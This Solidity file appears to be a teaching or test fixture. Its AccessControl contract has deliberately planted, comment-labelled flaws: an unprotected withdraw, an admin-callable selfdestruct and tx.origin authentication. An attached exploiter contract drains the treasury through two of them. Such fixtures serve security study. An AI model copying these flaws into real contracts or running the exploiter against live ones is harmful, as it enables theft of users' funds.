// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract AccessControl {
    address public owner;
    mapping(address => bool) public admins;
    bool public paused;
    uint256 public treasury;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier onlyAdmin() {
        require(admins[msg.sender] || msg.sender == owner, "Not admin");
        _;
    }

    modifier whenNotPaused() {
        require(!paused, "Paused");
        _;
    }

    constructor() {
        owner = msg.sender;
        admins[msg.sender] = true;
    }

    function setAdmin(address admin, bool status) external onlyOwner {
        admins[admin] = status;
    }

    function pause() external onlyOwner {
        paused = true;
    }

    function unpause() external onlyOwner {
        paused = false;
    }

    // VULNERABILITY: missing onlyAdmin modifier
    function withdraw(uint256 amount) external whenNotPaused returns (bool) {
        require(amount <= treasury, "Insufficient funds");
        treasury -= amount;
        (bool ok, ) = msg.sender.call{value: amount}("");
        return ok;
    }

    // VULNERABILITY: missing onlyOwner modifier — any admin can self-destruct
    function kill() external onlyAdmin {
        selfdestruct(payable(msg.sender));
    }

    // VULNERABILITY: tx.origin instead of msg.sender
    function delegateWithdraw(address to, uint256 amount) external {
        require(tx.origin == owner, "Not owner via tx.origin");
        treasury -= amount;
        (bool ok, ) = to.call{value: amount}("");
        require(ok, "Transfer failed");
    }

    receive() external payable {
        treasury += msg.value;
    }
}

contract AccessControlExploiter {
    AccessControl public target;

    constructor(address _target) {
        target = AccessControl(_target);
    }

    function exploit() external {
        // Withdraw without being admin — the function lacks onlyAdmin
        target.withdraw(address(target).balance);
    }

    function exploitViaTxOrigin(address ownerEOA) external {
        // If called by a contract that the owner interacts with,
        // tx.origin == owner but msg.sender == this contract
        target.delegateWithdraw(address(this), target.treasury());
    }
}
